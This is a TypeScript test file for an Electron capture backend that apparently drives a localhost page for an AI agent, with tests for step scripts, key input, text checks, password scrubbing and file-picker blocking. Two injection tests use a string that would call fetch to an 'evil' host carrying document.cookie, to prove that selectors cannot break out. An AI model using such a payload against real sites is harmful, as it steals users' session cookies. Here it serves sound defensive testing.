import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

// A fake BrowserWindow just deep enough to drive the capture backend: it records
// the step scripts it is asked to run (answering from `results`, then `fallback`)
// and the input events sent to it, answers the page-text read with `pageText`, and
// finishes loading as soon as loadURL is called. Its DevTools client logs each
// command (alongside each load, in `log`), fails the one named `cdpFails`, and
// lets a test deliver protocol events through `cdpEvent`.
const fake = vi.hoisted(() => {
  const state = {
    results: [] as unknown[],
    fallback: 'ok' as unknown,
    pageText: '' as unknown,
    scripts: [] as string[],
    inputs: [] as unknown[],
    /** Every page script run, the page-text read included, with its user-gesture flag. */
    gestures: [] as boolean[],
    log: [] as string[],
    cdpParams: new Map<string, unknown>(),
    cdpFails: '',
    cdpEvent: (_method: string, _params?: unknown): void => {},
    /** Called with each step script before it answers, so a test can raise protocol events. */
    onScript: (_script: string): void => {}
  }
  class FakeWebContents {
    private handlers = new Map<string, (...args: unknown[]) => void>()
    on(event: string, fn: (...args: unknown[]) => void): this {
      this.handlers.set(event, fn)
      return this
    }
    once(event: string, fn: (...args: unknown[]) => void): this {
      return this.on(event, fn)
    }
    emit(event: string): void {
      this.handlers.get(event)?.()
    }
    setFrameRate(): void {}
    setWindowOpenHandler(): void {}
    debugger = {
      attached: false,
      isAttached(): boolean {
        return this.attached
      },
      attach(): void {
        this.attached = true
      },
      detach(): void {
        this.attached = false
      },
      async sendCommand(method: string, params?: unknown): Promise<unknown> {
        state.log.push(`cdp ${method}`)
        state.cdpParams.set(method, params)
        if (method === state.cdpFails) throw new Error(`'${method}' wasn't found`)
        return {}
      },
      on(_event: string, listener: (event: unknown, method: string, params: unknown) => void): void {
        state.cdpEvent = (method, params) => listener(null, method, params)
      }
    }
    getURL(): string {
      return 'http://localhost:3000/'
    }
    isLoading(): boolean {
      return false
    }
    async executeJavaScript(script: string, userGesture?: boolean): Promise<unknown> {
      state.gestures.push(userGesture === true)
      if (script.includes('b.innerText.slice(')) return state.pageText
      state.scripts.push(script)
      state.onScript(script)
      return state.results.length ? state.results.shift() : state.fallback
    }
    sendInputEvent(event: unknown): void {
      state.inputs.push(event)
    }
    async capturePage(): Promise<{ toPNG: () => Buffer }> {
      return { toPNG: () => Buffer.from('PNG') }
    }
  }
  class BrowserWindow {
    webContents = new FakeWebContents()
    async loadURL(url: string): Promise<void> {
      state.log.push(`load ${url}`)
      this.webContents.emit('did-finish-load')
    }
    getTitle(): string {
      return ''
    }
    isDestroyed(): boolean {
      return false
    }
    destroy(): void {}
  }
  const ses = { webRequest: { onBeforeRequest: () => {} }, on: () => {}, setPermissionRequestHandler: () => {} }
  return { state, BrowserWindow, session: { fromPartition: () => ses } }
})
vi.mock('electron', () => ({ BrowserWindow: fake.BrowserWindow, session: fake.session }))

const {
  INVALID_SELECTOR,
  PAGE_TEXT_SCRIPT,
  PRESS_INPUT,
  expectTextError,
  stepScript,
  textScript,
  visibleScript,
  wireLocalhostCapture
} = await import('./localhostCapture')
const { PRESS_KEYS, REDACTED_PASSWORD, captureLocalhost, resetCaptureBackend } = await import('./agent/viewlocalhost')

describe('step scripts', () => {
  it('embeds selector and value as JSON literals, so they cannot break out', () => {
    const evil = `"); fetch("http://evil/"+document.cookie); ("`
    const fill = stepScript({ action: 'fill', selector: evil, value: evil })
    expect(fill).toContain(JSON.stringify(evil))
    expect(fill).not.toContain(`querySelector("${evil}")`)
    // The literal parses as a single string expression.
    expect(() => new Function(`return ${JSON.stringify(evil)}`)).not.toThrow()
  })

  it('guards native dialogs before acting and refuses file inputs', () => {
    for (const s of [
      stepScript({ action: 'click', selector: '#x' }),
      stepScript({ action: 'fill', selector: '#x', value: 'v' })
    ]) {
      expect(s).toContain('window.alert =')
      expect(s).toContain('window.confirm =')
      expect(s).toContain("'file inputs are not supported'")
    }
  })

  it('fills through the native value setter and fires input and change', () => {
    const s = stepScript({ action: 'fill', selector: '#x', value: 'v' })
    expect(s).toContain("getOwnPropertyDescriptor(Object.getPrototypeOf(el), 'value')")
    expect(s).toContain("new Event('input', { bubbles: true })")
    expect(s).toContain("new Event('change', { bubbles: true })")
  })

  it('tells the backend when a fill typed into a password field', () => {
    expect(stepScript({ action: 'fill', selector: '#x', value: 'v' })).toContain(
      `el.type === 'password' ? "ok:password" : 'ok'`
    )
  })

  it('reports an invalid selector from inside the page instead of throwing', () => {
    for (const s of [
      stepScript({ action: 'click', selector: '##' }),
      stepScript({ action: 'dblclick', selector: '##' }),
      stepScript({ action: 'press', key: 'Enter', selector: '##' })
    ]) {
      expect(s).toContain(`return ${JSON.stringify(INVALID_SELECTOR)}`)
    }
    expect(visibleScript('##')).toContain("return 'invalid'")
  })

  it('says which selector syntax works when one is invalid', () => {
    expect(INVALID_SELECTOR).toMatch(/^invalid CSS selector/)
    expect(INVALID_SELECTOR).toContain('only standard CSS')
    expect(INVALID_SELECTOR).toContain(':contains()')
    expect(INVALID_SELECTOR).toContain(':has-text()')
  })

  it('double-clicks with the full event sequence a real double click produces', () => {
    const s = stepScript({ action: 'dblclick', selector: '.todo label' })
    expect(s).toContain(JSON.stringify('.todo label'))
    expect(s).toContain('window.alert =')
    expect(s).toContain("'file inputs are not supported'")
    expect(s).toContain("for (const detail of [1, 2])")
    expect(s).toContain("['mousedown', 'mouseup', 'click']")
    expect(s).toContain("new MouseEvent('dblclick', { ...at, detail: 2 })")
  })

  it('focuses a press target and fails when it cannot take focus', () => {
    const s = stepScript({ action: 'press', key: 'Enter', selector: '#new' })
    expect(s).toContain(JSON.stringify('#new'))
    expect(s).toContain('el.focus()')
    expect(s).toContain("if (document.activeElement !== el) return 'the element cannot take keyboard focus'")
    expect(s).toContain("'file inputs are not supported'")
  })

  it('guards dialogs and refuses a focused file input for a press without a selector', () => {
    const s = stepScript({ action: 'press', key: 'Space' })
    expect(s).toContain('window.alert =')
    expect(s).not.toContain('querySelector')
    expect(s).toContain("document.activeElement.type === 'file'")
  })

  it('matches expect_text on visible rendered text, whitespace- and case-insensitively', () => {
    const s = textScript({ action: 'expect_text', text: 'Buy  Milk', absent: false, timeoutMs: 1 })
    expect(s).toContain(JSON.stringify('Buy  Milk'))
    expect(s).toContain("replace(/\\s+/g, ' ').trim().toLowerCase()")
    expect(s).toContain('el.innerText')
    expect(s).toContain('el.checkVisibility({ visibilityProperty: true })')
    // Page-wide without a selector, every matching element with one.
    expect(s).toContain('const els = document.body ? [document.body] : [];')
    const scoped = textScript({ action: 'expect_text', text: 'x', selector: '.todo li', absent: false, timeoutMs: 1 })
    expect(scoped).toContain(`document.querySelectorAll(${JSON.stringify('.todo li')})`)
    expect(scoped).toContain("catch { return 'invalid'; }")
  })

  it('embeds expect_text text and selector as JSON literals, so they cannot break out', () => {
    const evil = `"); fetch("http://evil/"+document.cookie); ("`
    const s = textScript({ action: 'expect_text', text: evil, selector: evil, absent: false, timeoutMs: 1 })
    expect(s.split(JSON.stringify(evil)).length - 1).toBe(2)
    expect(s).not.toContain(`norm("${evil}")`)
  })

  it('explains an expect_text failure from the last check', () => {
    const step = { action: 'expect_text' as const, text: 'x', absent: false, timeoutMs: 3000 }
    expect(expectTextError(step, 'missing')).toBe('the text is not visible within 3000ms')
    expect(expectTextError(step, undefined)).toBe('the text is not visible within 3000ms')
    expect(expectTextError({ ...step, absent: true }, 'found')).toBe('the text is still visible after 3000ms')
    expect(expectTextError({ ...step, selector: 'li' }, 'none')).toBe('no visible element matches the selector')
    expect(expectTextError({ ...step, absent: true, selector: 'li' }, 'none')).toBe(
      'no visible element matches the selector'
    )
    expect(expectTextError(step, 'none')).toBe('the page has no visible body')
  })

  it('reads page text from the rendered body only, capped in the page', () => {
    expect(PAGE_TEXT_SCRIPT).toContain('b.getClientRects().length ? b.innerText.slice(0, 50000)')
  })

  it('checks visibility, not just presence, for wait_for', () => {
    const s = visibleScript('.dashboard')
    expect(s).toContain('getBoundingClientRect')
    expect(s).toContain("s.display !== 'none'")
  })
})

describe('press key mapping', () => {
  it('maps every press key, with a char event only for Enter and Space', () => {
    expect(Object.keys(PRESS_INPUT).sort()).toEqual([...PRESS_KEYS].sort())
    const typing = Object.entries(PRESS_INPUT)
      .filter(([, v]) => v.char)
      .map(([k]) => k)
    expect(typing.sort()).toEqual(['Enter', 'Space'])
    expect(PRESS_INPUT.ArrowUp.keyCode).toBe('Up')
  })
})

describe('steps in the Electron backend', () => {
  beforeEach(() => {
    vi.useFakeTimers()
    fake.state.results = []
    fake.state.fallback = 'ok'
    fake.state.pageText = ''
    fake.state.scripts = []
    fake.state.inputs = []
    wireLocalhostCapture()
  })
  afterEach(() => {
    vi.useRealTimers()
    resetCaptureBackend()
  })

  const capture = async (
    steps: Parameters<typeof captureLocalhost>[0]['steps']
  ): ReturnType<typeof captureLocalhost> => {
    const p = captureLocalhost({ url: 'http://localhost:3000', steps })
    await vi.runAllTimersAsync()
    return p
  }

  it('focuses the target, then sends Enter as real input with its char event', async () => {
    const cap = await capture([{ action: 'press', key: 'Enter', selector: '#new' }])
    expect(cap.steps).toEqual([{ step: 'press Enter on "#new"', ok: true }])
    expect(fake.state.scripts).toHaveLength(1)
    expect(fake.state.scripts[0]).toContain('el.focus()')
    expect(fake.state.inputs).toEqual([
      { type: 'keyDown', keyCode: 'Enter' },
      { type: 'char', keyCode: 'Enter' },
      { type: 'keyUp', keyCode: 'Enter' }
    ])
  })

  it('sends a non-typing key to whatever has focus, without a char event', async () => {
    const cap = await capture([{ action: 'press', key: 'ArrowUp' }])
    expect(cap.steps).toEqual([{ step: 'press ArrowUp', ok: true }])
    expect(fake.state.inputs).toEqual([
      { type: 'keyDown', keyCode: 'Up' },
      { type: 'keyUp', keyCode: 'Up' }
    ])
  })

  it('sends no key when the target cannot take focus', async () => {
    fake.state.results = ['the element cannot take keyboard focus']
    const cap = await capture([
      { action: 'press', key: 'Enter', selector: 'div' },
      { action: 'press', key: 'Escape' }
    ])
    expect(cap.steps).toEqual([
      { step: 'press Enter on "div"', ok: false, error: 'the element cannot take keyboard focus' }
    ])
    expect(fake.state.inputs).toEqual([])
  })

  it('double-clicks through a page script, never synthesized OS input', async () => {
    const cap = await capture([{ action: 'dblclick', selector: '.todo label' }])
    expect(cap.steps).toEqual([{ step: 'double-click ".todo label"', ok: true }])
    expect(fake.state.scripts[0]).toContain("new MouseEvent('dblclick'")
    expect(fake.state.inputs).toEqual([])
  })

  it('reports the standard-CSS hint when wait_for gets an unparseable selector', async () => {
    fake.state.results = ['invalid']
    const cap = await capture([{ action: 'wait_for', selector: "button:has-text('All')", timeoutMs: 1000 }])
    expect(cap.steps).toEqual([
      { step: `wait for "button:has-text('All')"`, ok: false, error: INVALID_SELECTOR }
    ])
  })
})

describe('expect_text and page text in the Electron backend', () => {
  beforeEach(() => {
    vi.useFakeTimers()
    fake.state.results = []
    fake.state.fallback = 'ok'
    fake.state.pageText = ''
    fake.state.scripts = []
    fake.state.inputs = []
    wireLocalhostCapture()
  })
  afterEach(() => {
    vi.useRealTimers()
    resetCaptureBackend()
  })

  const capture = async (
    steps: Parameters<typeof captureLocalhost>[0]['steps']
  ): ReturnType<typeof captureLocalhost> => {
    const p = captureLocalhost({ url: 'http://localhost:3000', steps })
    await vi.runAllTimersAsync()
    return p
  }
  const expectText = (over: { absent?: boolean; selector?: string } = {}) => ({
    action: 'expect_text' as const,
    text: 'Buy milk',
    absent: over.absent ?? false,
    timeoutMs: 1000,
    ...(over.selector ? { selector: over.selector } : {})
  })

  it('passes once the text shows up', async () => {
    fake.state.results = ['missing', 'missing', 'found']
    const cap = await capture([expectText()])
    expect(cap.steps).toEqual([{ step: 'expect text "Buy milk"', ok: true }])
    expect(fake.state.scripts).toHaveLength(3)
  })

  it('fails when the text never shows up', async () => {
    fake.state.fallback = 'missing'
    const cap = await capture([expectText(), { action: 'press', key: 'Enter' }])
    expect(cap.steps).toEqual([
      { step: 'expect text "Buy milk"', ok: false, error: 'the text is not visible within 1000ms' }
    ])
  })

  it('passes absent once the text is gone, and fails while it stays', async () => {
    fake.state.results = ['found', 'missing']
    expect((await capture([expectText({ absent: true })])).steps).toEqual([
      { step: 'expect no text "Buy milk"', ok: true }
    ])
    fake.state.scripts = []
    fake.state.fallback = 'found'
    expect((await capture([expectText({ absent: true })])).steps).toEqual([
      { step: 'expect no text "Buy milk"', ok: false, error: 'the text is still visible after 1000ms' }
    ])
  })

  it('never passes absent vacuously when the scope matches nothing', async () => {
    fake.state.fallback = 'none'
    const cap = await capture([expectText({ absent: true, selector: '.todo-lsit li' })])
    expect(cap.steps).toEqual([
      {
        step: 'expect no text "Buy milk" in ".todo-lsit li"',
        ok: false,
        error: 'no visible element matches the selector'
      }
    ])
  })

  it('fails at once on an unparseable scope selector', async () => {
    fake.state.results = ['invalid']
    const cap = await capture([expectText({ selector: "li:contains('Buy')" })])
    expect(cap.steps?.[0]).toMatchObject({ ok: false, error: INVALID_SELECTOR })
    expect(fake.state.scripts).toHaveLength(1)
  })

  it('returns the page text after the steps', async () => {
    fake.state.pageText = 'todos\n\n  Buy milk  \n1 item left'
    const cap = await capture([{ action: 'press', key: 'Enter' }])
    expect(cap.pageText).toBe('todos\nBuy milk\n1 item left')
  })

  it('omits the page text when the read returns something other than text', async () => {
    fake.state.pageText = undefined
    const cap = await capture([])
    expect('pageText' in cap).toBe(false)
  })

  it('scrubs a value typed into a password field from the page text, but not other fills', async () => {
    fake.state.results = ['ok:password', 'ok']
    fake.state.pageText = 'Hi alice@example.test, your password is test-only-pass'
    const cap = await capture([
      { action: 'fill', selector: '#password', value: 'test-only-pass' },
      { action: 'fill', selector: '#email', value: 'alice@example.test' }
    ])
    expect(cap.steps?.every((s) => s.ok)).toBe(true)
    expect(cap.pageText).toBe(`Hi alice@example.test, your password is ${REDACTED_PASSWORD}`)
  })
})

describe('file pickers in the Electron backend', () => {
  beforeEach(() => {
    vi.useFakeTimers()
    Object.assign(fake.state, {
      results: [],
      fallback: 'ok',
      pageText: '',
      scripts: [],
      inputs: [],
      gestures: [],
      log: [],
      cdpParams: new Map(),
      cdpFails: '',
      onScript: () => {}
    })
    wireLocalhostCapture()
  })
  afterEach(() => {
    vi.useRealTimers()
    resetCaptureBackend()
  })

  const capture = async (input: Omit<Parameters<typeof captureLocalhost>[0], 'url'>): ReturnType<typeof captureLocalhost> => {
    const p = captureLocalhost({ url: 'http://localhost:3000', ...input })
    await vi.runAllTimersAsync()
    return p
  }

  it('arms file-chooser interception on a blank page before the real one loads', async () => {
    await capture({})
    expect(fake.state.log).toEqual([
      'load about:blank',
      'cdp Page.enable',
      'cdp Page.setInterceptFileChooserDialog',
      'load http://localhost:3000/'
    ])
    expect(fake.state.cdpParams.get('Page.setInterceptFileChooserDialog')).toEqual({ enabled: true, cancel: true })
  })

  it('refuses every step, and gives the page no user gesture, when pickers cannot be blocked', async () => {
    fake.state.cdpFails = 'Page.setInterceptFileChooserDialog'
    const cap = await capture({
      steps: [
        { action: 'click', selector: 'label[for=avatar]' },
        { action: 'press', key: 'Enter' }
      ]
    })
    expect(cap.steps).toEqual([
      {
        step: 'click "label[for=avatar]"',
        ok: false,
        error: 'steps are unavailable: file pickers could not be blocked in this page'
      }
    ])
    expect(fake.state.scripts).toEqual([])
    expect(fake.state.inputs).toEqual([])
    expect(fake.state.gestures.every((g) => !g)).toBe(true)
  })

  it('tells the model when a step opened a picker that was cancelled', async () => {
    // The click lands on a label for a file input: the browser intercepts the picker.
    fake.state.onScript = (script) => {
      if (script.includes('el.click()')) fake.state.cdpEvent('Page.fileChooserOpened', { mode: 'selectSingle' })
    }
    const cap = await capture({ steps: [{ action: 'click', selector: 'label[for=avatar]' }] })
    expect(cap.steps).toEqual([{ step: 'click "label[for=avatar]"', ok: true }])
    expect(cap.console).toContain('WARNING: [file chooser] cancelled: view_localhost cannot choose files')
  })

  it('reads the page and measures a selector without a user gesture', async () => {
    fake.state.pageText = 'Hello'
    await capture({ selector: '#hero' })
    expect(fake.state.gestures.length).toBeGreaterThanOrEqual(2) // the rect, then the page text
    expect(fake.state.gestures.every((g) => !g)).toBe(true)
  })
})
